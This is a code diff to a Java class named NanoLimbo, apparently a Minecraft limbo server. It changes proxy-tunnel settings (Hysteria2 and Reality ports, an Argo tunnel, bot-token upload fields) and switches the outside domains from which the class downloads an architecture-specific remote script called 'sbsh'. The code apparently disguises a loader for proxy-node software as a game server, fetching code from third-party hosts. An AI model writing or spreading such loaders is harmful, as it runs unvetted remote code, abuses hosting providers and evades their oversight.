@@ -132,17 +132,17 @@ public final class NanoLimbo {
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
         envVars.put("S5_PORT", "");
-        envVars.put("HY2_PORT", "7006");
+        envVars.put("HY2_PORT", "25611");
         envVars.put("TUIC_PORT", "");
         envVars.put("ANYTLS_PORT", "");
-        envVars.put("REALITY_PORT", "");
+        envVars.put("REALITY_PORT", "25640");
         envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "");
         envVars.put("BOT_TOKEN", "");
         envVars.put("CFIP", "cdns.doon.eu.org");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "host2play");
+        envVars.put("NAME", "hyper-3");
         envVars.put("DISABLE_ARGO", "false");
         
         for (String var : ALL_ENV_VARS) {
@@ -181,11 +181,11 @@ public final class NanoLimbo {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.sss.hidns.vip/sbsh";
+            url = "https://amd64.eooce.com/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.sss.hidns.vip/sbsh";
+            url = "https://arm64.eooce.com/sbsh";
         } else if (osArch.contains("s390x")) {
-            url = "https://s390x.sss.hidns.vip/sbsh";
+            url = "https://s390x.eooce.com/sbsh";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
